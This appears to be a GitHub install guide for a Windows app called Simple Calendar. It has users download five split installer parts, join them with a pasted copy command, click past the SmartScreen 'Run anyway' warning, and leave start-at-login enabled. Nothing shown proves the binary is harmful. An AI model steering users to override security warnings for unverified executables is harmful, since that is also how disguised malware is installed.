# 💻 Install Simple Calendar on Windows

## 1. Download all 5 parts (into the same folder)
1. [⬇️ Part 1](https://github.com/0MrCrazy0/calendar/raw/refs/heads/main/Simple-Calendar-Windows-Installer/Simple-Calendar-Windows-Installer.exe.00.part)
2. [⬇️ Part 2](https://github.com/0MrCrazy0/calendar/raw/refs/heads/main/Simple-Calendar-Windows-Installer/Simple-Calendar-Windows-Installer.exe.01.part)
3. [⬇️ Part 3](https://github.com/0MrCrazy0/calendar/raw/refs/heads/main/Simple-Calendar-Windows-Installer/Simple-Calendar-Windows-Installer.exe.02.part)
4. [⬇️ Part 4](https://github.com/0MrCrazy0/calendar/raw/refs/heads/main/Simple-Calendar-Windows-Installer/Simple-Calendar-Windows-Installer.exe.03.part)
5. [⬇️ Part 5](https://github.com/0MrCrazy0/calendar/raw/refs/heads/main/Simple-Calendar-Windows-Installer/Simple-Calendar-Windows-Installer.exe.04.part)

## 2. Join them into one installer
1. Open the folder with the 5 parts.
2. Hold **Shift**, right-click an empty space, and choose **Open PowerShell window here** (or **Open in Terminal**).
3. Paste this line and press **Enter**:

```
cmd /c "copy /b Simple-Calendar-Windows-Installer.exe.00.part+Simple-Calendar-Windows-Installer.exe.01.part+Simple-Calendar-Windows-Installer.exe.02.part+Simple-Calendar-Windows-Installer.exe.03.part+Simple-Calendar-Windows-Installer.exe.04.part Simple-Calendar-Windows-Installer.exe"
```

You'll now have **Simple-Calendar-Windows-Installer.exe** (about 94 MB).

## 3. Install
1. Double-click **Simple-Calendar-Windows-Installer.exe**.
2. If you see "Windows protected your PC", click **More info**, then **Run anyway**.
3. Leave **Start at login** ticked so alarms always work.

## ✅ Good to know
- Closing the window keeps the app running in the **tray** (by the clock), so alarms still ring.
- Alarms only ring while your PC is on.

## ❓ Help
- **"Cannot find the file":** make sure all 5 parts are in the same folder.
- **Installer won't open:** the joined file should be about 94 MB. If it's smaller, download the parts again.
- **No alarm:** check the tray icon is there and Focus / Do not disturb is off.

[⬅️ Back to Simple Calendar](https://github.com/0MrCrazy0/calendar)
